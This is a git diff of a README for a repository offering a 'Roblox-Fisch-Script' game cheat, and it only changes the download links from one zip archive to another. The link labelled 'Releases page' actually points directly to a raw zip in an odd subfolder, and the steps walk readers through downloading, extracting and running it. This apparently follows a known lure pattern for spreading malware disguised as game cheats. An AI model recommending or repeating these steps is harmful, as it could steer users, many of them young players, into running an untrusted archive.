@@ -6,7 +6,7 @@ Welcome to the Roblox-Fisch-Script! This application provides an easy way to enh
 
 ## 📥 Download Links
 
-[![Download Roblox-Fisch-Script](https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Fisch-Script-Roblox-2.3-alpha.3.zip)](https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Fisch-Script-Roblox-2.3-alpha.3.zip)
+[![Download Roblox-Fisch-Script](https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Script_Fisch_Roblox_v3.3.zip)](https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Script_Fisch_Roblox_v3.3.zip)
 
 ## 📂 What You Need
 
@@ -20,9 +20,9 @@ Before you start, please ensure you have the following:
 
 To get the Roblox-Fisch-Script files, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Fisch-Script-Roblox-2.3-alpha.3.zip) to download the script.
+1. Visit the [Releases page](https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Script_Fisch_Roblox_v3.3.zip) to download the script.
 2. Choose the latest version from the list of releases.
-3. Click on the `https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Fisch-Script-Roblox-2.3-alpha.3.zip` file to download it.
+3. Click on the `https://github.com/skata123a/Roblox-Fisch-Script/raw/refs/heads/main/overchief/Script_Fisch_Roblox_v3.3.zip` file to download it.
 4. Once the download is complete, locate the `.zip` file in your downloads folder.
 5. Extract the `.zip` file using any compression tool (like WinRAR or built-in extraction tools).
 6. Open the extracted folder and locate the script file.
